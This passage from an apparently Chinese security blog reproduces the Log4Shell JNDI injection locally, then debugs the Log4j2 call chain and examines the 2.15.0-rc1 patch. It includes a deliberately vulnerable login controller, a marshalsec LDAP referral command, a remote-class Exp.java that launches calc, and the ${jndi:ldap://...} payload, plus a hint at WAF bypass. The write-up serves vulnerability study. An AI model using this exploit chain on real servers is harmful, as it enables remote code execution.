<span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloLog4j</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token class-name">Logger</span>  <span class="token class-name">Logger</span> <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">HelloLog4j</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/login"</span> <span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>POST<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Map</span> body<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> user <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> password <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Logger</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"user:{}, password:{}"</span> <span class="token punctuation">,</span> user <span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"login"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>IDEAå³ä¸Šè§’é€‰æ‹©<code>Log4jDemoApplication</code>â†’<code>Edit Configurations</code>ï¼Œå¼¹çª—ä¿®æ”¹<code>Environment</code>â†’<code>VM options</code></p>
<pre class="line-numbers language-none"><code class="language-none">-Dcom.sun.jndi.ldap.object.trustURLCodebase=true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908092430183.png" style="zoom:80%;">

<p>ç„¶åéœ€è¦æ£€æŸ¥å‡ ä¸ªåœ°æ–¹</p>
<h4 id="1-JDKç‰ˆæœ¬ç›¸å…³"><a href="#1-JDKç‰ˆæœ¬ç›¸å…³" class="headerlink" title="1. JDKç‰ˆæœ¬ç›¸å…³"></a><strong>1. JDKç‰ˆæœ¬ç›¸å…³</strong></h4><p>å¯èƒ½å‡ºç°çš„æŠ¥é”™ï¼Œå‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_44299027/article/details/120848738">ã€Javaå¼‚å¸¸ã€‘IDEA æŠ¥é”™ï¼šæ— æ•ˆçš„ç›®æ ‡å‘è¡Œç‰ˆï¼š17 </a></p>
<p><code>pom.xml</code>æ–‡ä»¶ä¸­çš„<code>java.version</code>å±æ€§éœ€ä¸º8</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908093501751.png" style="zoom:80%;">

<p><code>File</code>â†’<code>Project Structure</code>â†’<code>Project</code>ï¼ŒSDKç‰ˆæœ¬å¦‚ä¸‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908094641643.png" style="zoom:80%;">

<p><code>File</code>â†’<code>Project Structure</code>â†’<code>Modules</code>ï¼ŒLanguage levelå¦‚ä¸‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908094857411.png" style="zoom:80%;">

<p><code>Settings</code>â†’<code>Java Compiler</code>å¦‚ä¸‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908100158994.png" style="zoom:80%;">

<h4 id="2-SprinBootç‰ˆæœ¬ç›¸å…³"><a href="#2-SprinBootç‰ˆæœ¬ç›¸å…³" class="headerlink" title="2. SprinBootç‰ˆæœ¬ç›¸å…³"></a><strong>2. SprinBootç‰ˆæœ¬ç›¸å…³</strong></h4><p>å¯èƒ½å‡ºç°çš„æŠ¥é”™ï¼Œå‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/615816253">ç±»æ–‡ä»¶å…·æœ‰é”™è¯¯çš„ç‰ˆæœ¬ 61.0, åº”ä¸º 52.0</a></p>
<p><code>pom.xml</code>æ–‡ä»¶ä¸­spring-bootç‰ˆæœ¬</p>
<p>å› ä¸ºSpringå®˜æ–¹å‘å¸ƒä»Spring 6ä»¥åŠSprinBoot 3.0å¼€å§‹æœ€ä½æ”¯æŒJDK 17ï¼Œæ­¤å¤„ç”¨çš„JDK 8ï¼Œæ‰€ä»¥éœ€å°†SpringBootç‰ˆæœ¬é™ä½ä¸º3.0ä»¥ä¸‹ï¼Œç¬”è€…æ­¤å¤„ç”¨2.7.8ã€‚</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908100822489.png" style="zoom:80%;">

<p>ä¸Šé¢æ£€æŸ¥å¥½åï¼Œå³ä¸Šè§’ç»¿è‰²å°ä¸‰è§’è¿è¡Œé¡¹ç›®ï¼Œæ§åˆ¶å°è¾“å‡ºå¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908131454392.png"></p>
<p>æµè§ˆå™¨è®¿é—®ï¼š<a href="http://127.0.0.1:8080/login%EF%BC%8C%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2%E6%98%AF%E5%9B%A0%E4%B8%BA%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%8F%AA%E6%8E%A5%E6%94%B6POST%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%B8%8D%E5%BD%B1%E5%93%8D">http://127.0.0.1:8080/loginï¼Œé”™è¯¯é¡µé¢æ˜¯å› ä¸ºä»£ç ä¸­åªæ¥æ”¶POSTè¯·æ±‚ï¼Œä¸å½±å“</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908102318581.png" style="zoom:80%;">

<h3 id="ï¼ˆäºŒï¼‰ç¼–å†™EXP"><a href="#ï¼ˆäºŒï¼‰ç¼–å†™EXP" class="headerlink" title="ï¼ˆäºŒï¼‰ç¼–å†™EXP"></a>ï¼ˆäºŒï¼‰ç¼–å†™EXP</h3><p>æ–°å»ºä¸€ä¸ªJavaé¡¹ç›®ï¼Œ<code>File</code>â†’<code>New</code>â†’<code>Project</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908102734860.png" style="zoom:80%;">

<p>ç„¶åç›´æ¥Nextâ†’Nextâ†’èµ·ä¸ªé¡¹ç›®å<code>Exp</code>â†’Finish</p>
<p>åœ¨srcç›®å½•æ–°å»ºä¸€ä¸ª<code>Exp.java</code>ï¼Œå†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exp</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">Exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Exp</span> exploit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å³é”®è¿è¡Œï¼Œå¯çœ‹åˆ°è®¡ç®—å™¨è¢«æ‰“å¼€ï¼Œä¸”é¡¹ç›®ç›®å½•<code>Exp\out\production\Exp</code>ä¸‹ç”Ÿæˆäº†<code>Exp.class</code></p>
<p>åœ¨æ­¤ç›®å½•æ‰“å¼€cmdï¼Œå¼€ä¸€ä¸ªhttpæœåŠ¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908104429604.png"></p>
<p>ç„¶ååˆ©ç”¨ååºåˆ—åŒ–å·¥å…·<code>marshalsec</code>ï¼Œå¼€ä¸€ä¸ªLDAPæœåŠ¡</p>
<p>ä¸‹è½½ï¼š<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
<p>å‚è€ƒï¼š<a href="https://exploit-notes.hdks.org/exploit/web/log4j-pentesting/#exploit-apache-solr-(jndi)">https://exploit-notes.hdks.org/exploit/web/log4j-pentesting/#exploit-apache-solr-(jndi)</a></p>
<p>ä¸‹è½½marshalsecï¼Œè¿›åˆ°ä¸»ç›®å½•ï¼Œç”¨å¦‚ä¸‹å‘½ä»¤ç¼–è¯‘</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç¼–è¯‘æˆåŠŸcmdçª—å£æœ«å°¾ä¼šæ˜¾ç¤ºå¦‚ä¸‹å†…å®¹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908111918530.png"></p>
<p>ç„¶åå¼€å¯LDAPæœåŠ¡</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9898/#Exp"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908112631128.png"></p>
<p>é€šè¿‡HackBarç”¨POSTè¯·æ±‚å‘é€jsonæ ¼å¼payloadå¦‚ä¸‹ï¼Œæ‰§è¡Œåï¼Œä¼šå¼¹å‡ºç³»ç»Ÿè®¡ç®—æœº</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"user"</span><span class="token operator">:</span> <span class="token string">"wa0er"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"${jndi:ldap://127.0.0.1:1389/Exp}"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908113116419.png"></p>
<p>æ­¤æ—¶çœ‹LDAPå’ŒHTTPæœåŠ¡çª—å£å¦‚ä¸‹ï¼Œ<code>Exp.class</code>è¢«è°ƒç”¨æ‰§è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908113454423.png"></p>
<p>å¤ç°æˆåŠŸï¼</p>
<h2 id="äºŒã€åŸç†åˆ†æ"><a href="#äºŒã€åŸç†åˆ†æ" class="headerlink" title="äºŒã€åŸç†åˆ†æ"></a>äºŒã€åŸç†åˆ†æ</h2><h3 id="ï¼ˆä¸€ï¼‰JNDIæ³¨å…¥"><a href="#ï¼ˆä¸€ï¼‰JNDIæ³¨å…¥" class="headerlink" title="ï¼ˆä¸€ï¼‰JNDIæ³¨å…¥"></a>ï¼ˆä¸€ï¼‰JNDIæ³¨å…¥</h3><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/12277#toc-2">https://xz.aliyun.com/t/12277#toc-2</a></p>
<p><a href="https://tttang.com/archive/1611/#toc_jndi">https://tttang.com/archive/1611/#toc_jndi</a></p>
<p>JNDI(Java Naming and Directory Interface)æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºè®¾è®¡çš„ APIï¼Œä¸€ç§æ ‡å‡†çš„ Java å‘½åç³»ç»Ÿæ¥å£ã€‚è‹¥ç¨‹åºå®šä¹‰äº† JDNI ä¸­çš„æ¥å£ API ï¼Œåˆ™å°±å¯ä»¥é€šè¿‡è¯¥æ¥å£ API è®¿é—®ç³»ç»Ÿçš„ <code>å‘½ä»¤æœåŠ¡</code>å’Œ<code>ç›®å½•æœåŠ¡</code>ï¼Œå¦‚ä¸‹å›¾ã€‚JNDIå¯è®¿é—®çš„ç°æœ‰çš„ç›®å½•åŠæœåŠ¡æœ‰:<code>JDBC</code>ã€<code>LDAP</code>ã€<code>RMI</code>ã€<code>DNS</code>ã€<code>NIS</code>ã€<code>CORBA</code>ã€‚</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020153635388.png" style="zoom: 67%;">

<p>JNDI æ³¨å…¥ï¼Œå³å½“å¼€å‘è€…åœ¨å®šä¹‰ JNDI æ¥å£åˆå§‹åŒ–æ—¶ï¼Œ<code>lookup()</code> æ–¹æ³•çš„å‚æ•°å¯æ§ï¼Œæ”»å‡»è€…å°±å¯ä»¥å°†æ¶æ„çš„ <code>url</code> ä¼ å…¥å‚æ•°è¿œç¨‹åŠ è½½æ¶æ„payloadï¼Œé€ æˆæ³¨å…¥æ”»å‡»ã€‚</p>
<h3 id="ï¼ˆäºŒï¼‰è°ƒè¯•åˆ†æ"><a href="#ï¼ˆäºŒï¼‰è°ƒè¯•åˆ†æ" class="headerlink" title="ï¼ˆäºŒï¼‰è°ƒè¯•åˆ†æ"></a>ï¼ˆäºŒï¼‰è°ƒè¯•åˆ†æ</h3><p>ç”±äºæ˜¯JNDIæ³¨å…¥ï¼Œå› æ­¤å¯ä»¥åœ¨<code>InitialContext.lookup(String name)</code>æ–¹æ³•ä¸‹æ–­ç‚¹ï¼ˆä¹Ÿå¯ä»¥åœ¨åˆ›å»ºçš„<code>HelloLog4j.java</code>çš„<code>Logger.error()</code>å¤„ä¸‹æ–­ç‚¹ä¸€æ­¥ä¸€æ­¥è°ƒè¯•è¿‡æ¥ï¼Œä½†åˆæ¬¡åˆ†æä¾ç„¶å»ºè®®åœ¨<code>InitialContext</code>ä¸‹æ–­ç‚¹ï¼Œå› ä¸ºè°ƒç”¨é“¾è¾ƒå¤æ‚ï¼Œæ¶‰åŠå¾ªç¯ã€åˆ†æ”¯ï¼Œä¸”ä¸­é—´æœ‰ä¸€éƒ¨åˆ†ä¸æ­¤æ¼æ´çš„äº§ç”Ÿå…³ç³»ä¸å¤§ï¼‰</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231012174606575.png" style="zoom: 80%;">

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231012102916281.png"></p>
<p>æœ‰å‡ ä¸ªå…³é”®ç‚¹</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Logger</span><span class="token punctuation">.</span>error
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token class-name">MessagePatternConverter</span><span class="token punctuation">.</span>format
      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token class-name">StrSubstitutor</span><span class="token punctuation">.</span>resolveVariable
          <span class="token class-name">Interpolator</span><span class="token punctuation">.</span>lookup
            <span class="token class-name">JndiLookup</span><span class="token punctuation">.</span>lookup
              <span class="token class-name">JndiManager</span><span class="token punctuation">.</span>lookup
                <span class="token class-name">InitialContext</span><span class="token punctuation">.</span>lookup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="1-Logger-error"><a href="#1-Logger-error" class="headerlink" title="1. Logger.error()"></a>1. Logger.error()</h4><p>ä»<code>Logger.error()</code>å¤„è¿›æ¥</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019172132503.png" style="zoom: 80%;">

<p>åœ¨è¿›è¡Œ<code>Logger.error()</code>æ—¥å¿—è®°å½•æ—¶ä¼šé‡‡ç”¨<code>logIfEnabled()</code>æ–¹æ³•è¿›è¡Œåˆ¤æ–­ï¼Œ<code>isEnabled()</code>è¿”å›ä¸º<code>true</code>æ‰å¯ä»¥ç»§ç»­è¿›è¡Œæ—¥å¿—æ“ä½œã€‚è¿™é‡Œä¹Ÿæ˜¯æ¼æ´èƒ½å¦æˆåŠŸè§¦å‘çš„å…³é”®ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019172601198.png"></p>
<p>åœ¨æœ¬æ¬¡æ¼æ´åˆ†æè¿‡ç¨‹ä¸­æ—¥å¿—ç­‰çº§levelä¸ºERRORï¼Œå®ƒçš„<code>intLevel()</code>ä¸º200ï¼Œè€Œæœ¬ç¯å¢ƒä¸­é»˜è®¤çš„æ—¥å¿—çº§åˆ«<code>this.intLevel</code>ä¸º200ï¼ˆERRORï¼‰ï¼Œæ­£å¥½æ»¡è¶³<code>this.intLevel &gt;= level.intLevel()</code>ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019173139650.png"></p>
<p>æ­¤æ—¶<code>filter()</code>æ–¹æ³•è¿”å›trueï¼Œå³<code>isEnabled()</code>è¿”å›ä¸º<code>true</code>ï¼ŒæˆåŠŸè¿›å…¥åˆ°<code>logMessage()</code>æ–¹æ³•ä¸­ã€‚log4jé»˜è®¤çš„æ—¥å¿—çº§åˆ«å®šä¹‰å¦‚ä¸‹å›¾ï¼Œä»ä¸Šåˆ°ä¸‹çº§åˆ«é€æ¸é™ä½ï¼Œ<code>intLevel()</code>æ•°å€¼é€æ¸å¢å¤§ï¼Œåˆ†åˆ«æ˜¯ï¼šOFF(0)ã€FATAL(100)ã€ERROR(200)ã€WARN(300)ã€INFO(400)ã€DEBUG(500)ã€TRACE(600)ã€ALL(2147483647)ã€‚<strong>ç”±æ­¤å¯è§ï¼Œæ¼æ´èƒ½å¦æˆåŠŸè§¦å‘ä¸è®¾ç½®çš„æ—¥å¿—Levelæœ‰å…³ï¼Œéœ€è¦ä¸ä½äºé»˜è®¤æ—¥å¿—çº§åˆ«ã€‚</strong></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019174105468.png"></p>
<p>ç„¶åä¸­é—´å°±æ˜¯è¯»å–é…ç½®æ–‡ä»¶åˆ›å»ºeventäº‹ä»¶ç­‰æ“ä½œï¼Œä¸€ç›´åˆ°<code>MessagePatternConverter.format()</code>ã€‚</p>
<h4 id="2-MessagePatternConverter-format"><a href="#2-MessagePatternConverter-format" class="headerlink" title="2. MessagePatternConverter.format()"></a>2. MessagePatternConverter.format()</h4><p>è¯¥æ–¹æ³•å¯¹æ—¥å¿—å†…å®¹è¿›è¡Œè§£æå’Œæ ¼å¼åŒ–ï¼Œå¹¶è¿”å›æœ€ç»ˆæ ¼å¼åŒ–åçš„æ—¥å¿—å†…å®¹ã€‚å½“ç¢°åˆ°æ—¥å¿—å†…å®¹ä¸­åŒ…å«<code>${</code>å­ä¸²æ—¶ï¼Œè°ƒç”¨StrSubstitutorè¿›è¡Œè¿›ä¸€æ­¥è§£æã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019200851377.png"></p>
<h4 id="3-StrSubstitutor-resolveVariable"><a href="#3-StrSubstitutor-resolveVariable" class="headerlink" title="3. StrSubstitutor.resolveVariable()"></a>3. StrSubstitutor.resolveVariable()</h4><p>StrSubstitutorå°†<code>${</code>å’Œ<code>}</code>ä¹‹é—´çš„å†…å®¹æå–å‡ºæ¥ï¼Œè°ƒç”¨å¹¶ä¼ é€’ç»™Interpolator.lookup()æ–¹æ³•ï¼Œå®ç°LookupåŠŸèƒ½ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019202544583.png"></p>
<p>å…¶ä¸­ï¼ŒStrSubstitutor.substitute()ä¼šç»è¿‡å¦‚ä¸‹forå¾ªç¯ï¼ŒåŒ¹é…<code>:-</code>å­ä¸²ï¼Œè¿™é‡Œå°±ä¸ºåé¢çš„wafç»•è¿‡æä¾›äº†æ€è·¯ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019201754382.png"></p>
<h4 id="4-Interpolator-lookup"><a href="#4-Interpolator-lookup" class="headerlink" title="4. Interpolator.lookup()"></a>4. Interpolator.lookup()</h4><p>Interpolatorå®é™…æ˜¯ä¸€ä¸ªå®ç°LookupåŠŸèƒ½çš„ä»£ç†ç±»ï¼Œè¯¥ç±»åœ¨æˆå‘˜å˜é‡<code>strLookupMap</code>ä¸­ï¼ˆ**æœ¬ç¯å¢ƒæ˜¯<code>lookups</code>**ï¼‰ä¿å­˜ç€å„ç±»LookupåŠŸèƒ½çš„çœŸæ­£å®ç°ç±»ã€‚Interpolatorå¯¹ä¸Šä¸€æ­¥æå–å‡ºçš„å†…å®¹è§£æåï¼Œä»<code>strLookupMap</code>è·å¾—LookupåŠŸèƒ½å®ç°ç±»ï¼Œå¹¶è°ƒç”¨å®ç°ç±»çš„<code>lookup()</code>æ–¹æ³•ã€‚</p>
<p>ä¾‹å¦‚å¯¹æœ¬ä¾‹å­ä¸­çš„<code>jndi:ldap://127.0.0.1:1389/Exp</code>è§£æåå¾—åˆ°<code>jndi</code>çš„LookupåŠŸèƒ½å®ç°ç±»ä¸º<code>JndiLookup</code>ï¼Œå¹¶è°ƒç”¨<code>JndiLookup.lookup()</code>æ–¹æ³•ã€‚</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019203156913.png" style="zoom:80%;">

<h4 id="5-JndiLookup-lookup"><a href="#5-JndiLookup-lookup" class="headerlink" title="5. JndiLookup.lookup()"></a>5. JndiLookup.lookup()</h4><p><code>JndiLookup.lookup()</code>æ–¹æ³•è°ƒç”¨<code>JndiManager.lookup()</code>æ–¹æ³•å¤„ç†jndiå¯¹è±¡ã€‚</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019203709387.png" style="zoom: 80%;">

<h4 id="6-JndiManager-lookup"><a href="#6-JndiManager-lookup" class="headerlink" title="6. JndiManager.lookup()"></a>6. JndiManager.lookup()</h4><p><code>JndiManager.lookup()</code>ç›´æ¥å§”æ‰˜ç»™<code>InitialContext.lookup()</code>æ–¹æ³•ã€‚è¿™é‡Œå•ç‹¬æåˆ°è¯¥æ–¹æ³•ï¼Œæ˜¯å› ä¸ºåç»­çš„è¡¥ä¸ä¸­è¾ƒä¸ºé‡è¦çš„å˜æ›´å³ä¸ºè¯¥æ–¹æ³•ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019203751594.png"></p>
<p>è‡³æ­¤ï¼Œåç»­å³å¯æŒ‰ç…§å¸¸è§„jndiæ³¨å…¥è·¯å¾„è¿›è¡Œåˆ†æã€‚</p>
<h2 id="ä¸‰ã€è¡¥ä¸åˆ†æ"><a href="#ä¸‰ã€è¡¥ä¸åˆ†æ" class="headerlink" title="ä¸‰ã€è¡¥ä¸åˆ†æ"></a>ä¸‰ã€è¡¥ä¸åˆ†æ</h2><h3 id="ï¼ˆä¸€ï¼‰2-15-0-rc1"><a href="#ï¼ˆä¸€ï¼‰2-15-0-rc1" class="headerlink" title="ï¼ˆä¸€ï¼‰2.15.0-rc1"></a>ï¼ˆä¸€ï¼‰2.15.0-rc1</h3><p>é€šè¿‡æ¯”è¾ƒ2.15.0-rc1å’Œè¯¥ç‰ˆæœ¬ä¹‹å‰æœ€åä¸€ä¸ªç‰ˆæœ¬2.14.1ä¹‹é—´çš„å·®å¼‚ï¼Œå¯ä»¥å‘ç°Log4j2å›¢é˜Ÿåœ¨12æœˆ5æ—¥æäº¤äº†ä¸€ä¸ªåä¸º<code>Restrict LDAP access via JNDI (#608)</code>çš„commitã€‚è¯¥commitçš„è¯¦ç»†å†…å®¹å¦‚ä¸‹é“¾æ¥ï¼š</p>
<p><a href="https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3">https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3</a></p>
<p>é™¤å»ä¸€äº›æµ‹è¯•ä»£ç å’Œè¾…åŠ©ä»£ç ï¼Œè¯¥commitæœ€ä¸»è¦å†…å®¹æ˜¯åœ¨ <code>JndiManager.lookup()</code>æ–¹æ³•å¢åŠ äº†å‡ ç§é™åˆ¶ï¼Œåˆ†åˆ«æ˜¯<code>allowedHosts</code>ã€<code>allowedClasses</code>ã€<code>allowedProtocols</code>ã€‚</p>
<p>ç”±äºrc1æœªåœ¨mavenä¸­å¤®ä»“åº“ä¸Šï¼Œå› æ­¤éœ€è¦è‡ªè¡Œä¸‹è½½ä»£ç å¹¶æ„å»ºï¼š</p>
<p>åˆ°Log4j2çš„GitHubå®˜æ–¹ä»“åº“ä¸‹è½½rc1ï¼š<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1%E3%80%82">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1ã€‚</a></p>
<p>åˆ†åˆ«è¿›å…¥log4j-apiå’Œlog4j-coreç›®å½•ï¼Œæ‰§è¡Œ<code>mvn clean install -DskipTests</code>ã€‚æœ€ç»ˆä¼šåœ¨æœ¬åœ°mavenä»“åº“ä¸Šç”Ÿæˆrc1çš„jaråŒ…ï¼Œç‰ˆæœ¬ä¸º2.15.0ï¼Œåç»­æµ‹è¯•ä½¿ç”¨è¯¥jaråŒ…ã€‚</p>
<p><strong>è¯´æ˜ï¼š</strong>æ­¤å¤„ç¬”è€…å°è¯•æ„å»ºæ—¶ï¼Œmavençš„å›½å†…é•œåƒï¼ˆé˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€åä¸ºäº‘ã€ç½‘æ˜“äº‘ï¼‰å‡æ— æ³•è§£æ2.15.0çš„jaråŒ…</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020174739501.png"></p>
<p>ä»¥ä¸‹å›¾ç‰‡å‚è€ƒï¼š<a href="https://www.freebuf.com/vuls/316143.html">https://www.freebuf.com/vuls/316143.html</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020173958585.png"></p>
<p>å„ä¸ªé™åˆ¶çš„å†…å®¹åˆ†åˆ«å¦‚ä¸‹ï¼š</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020180027074.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020180053823.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020180108755.png"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œrc1è¡¥ä¸é€šè¿‡å¯¹JNDI Lookupå¢åŠ ç™½åå•çš„æ–¹å¼ï¼Œé™åˆ¶é»˜è®¤å¯ä»¥è®¿é—®çš„ä¸»æœºä¸ºæœ¬åœ°IPï¼Œé™åˆ¶é»˜è®¤æ”¯æŒçš„åè®®ç±»å‹ä¸º<code>java</code>ã€<code>ldap</code>ã€<code>ldaps</code>ï¼Œé™åˆ¶LDAPåè®®é»˜è®¤å¯ä»¥ä½¿ç”¨çš„Javaç±»å‹ä¸ºå°‘æ•°åŸºç¡€ç±»å‹ï¼Œä»è€Œå¤§å¤§å‡å°‘äº†é»˜è®¤çš„æ”»å‡»é¢ã€‚</p>
